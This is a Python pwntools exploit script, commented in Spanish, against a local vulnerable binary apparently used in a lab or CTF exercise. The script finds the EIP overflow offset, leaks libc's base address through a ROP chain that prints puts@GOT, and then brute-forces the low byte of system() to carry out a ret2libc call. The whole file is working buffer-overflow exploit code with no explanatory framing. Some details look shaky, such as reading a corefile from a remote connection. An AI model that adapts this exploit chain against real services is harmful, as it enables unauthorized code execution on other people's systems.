#!/usr/bin/env python3

from pwn import remote, cyclic, cyclic_find, ELF, ROP, flat, p32, u32
import time, socket

HOST = "localhost"
PORT = 9999

# 1) Detectar offset EIP
def find_offset():
    io = remote(HOST, PORT)
    pattern = cyclic(400)
    io.send(pattern)
    io.wait()  # espera al crash
    core = io.corefile
    eip = core.eip
    return cyclic_find(eip)

# 2) Leer base de libc vía interrupción controlada
def leak_libc_base(offset):
    # Creamos payload para filtrar puts@GOT y volver al main
    elf = ELF("./vuln1_r2lib")
    libc = elf.libc
    rop = ROP(elf)
    pop_ret = rop.find_gadget(['pop ebx','ret'])[0]

    payload = flat(
        b"A"*offset,
        pop_ret, elf.got['puts'],
        elf.plt['puts'],
        elf.symbols['main']
    )

    io = remote(HOST, PORT)
    io.send(payload)
    io.recvline()
    puts_leak = u32(io.recv(4))
    base = puts_leak - libc.symbols['puts']
    return base, libc

# 3) Bruteforcear solo el LSB de system (8 bits)
def brute_system(offset, libc_base, libc):
    addr_exit = libc_base + libc.symbols['exit']
    addr_ls   = libc_base + next(libc.search(b"ls\x00"))
    base_system = libc_base + libc.symbols['system'] & 0xFFFFFF00

    for low in range(0x00, 0x100):
        system_addr = base_system | low
        payload = flat(
            b"A"*offset,
            p32(system_addr),
            p32(addr_exit),
            p32(addr_ls)
        )
        io = remote(HOST, PORT, timeout=0.3)
        io.send(payload)
        try:
            data = io.recv(1024)
            if b"bin" in data or b"usr" in data:
                print("[+] Encontrado system():", hex(system_addr))
                return system_addr
        except EOFError:
            pass
        finally:
            io.close()
    raise Exception("No encontramos el byte correcto")

if __name__ == "__main__":
    off = find_offset()
    print("[*] Offset EIP =", off)
    libc_base, libc = leak_libc_base(off)
    print(f"[*] Base libc = {hex(libc_base)}")
    sys_addr = brute_system(off, libc_base, libc)
    print("[*] ¡Exploit completo! system @", hex(sys_addr))
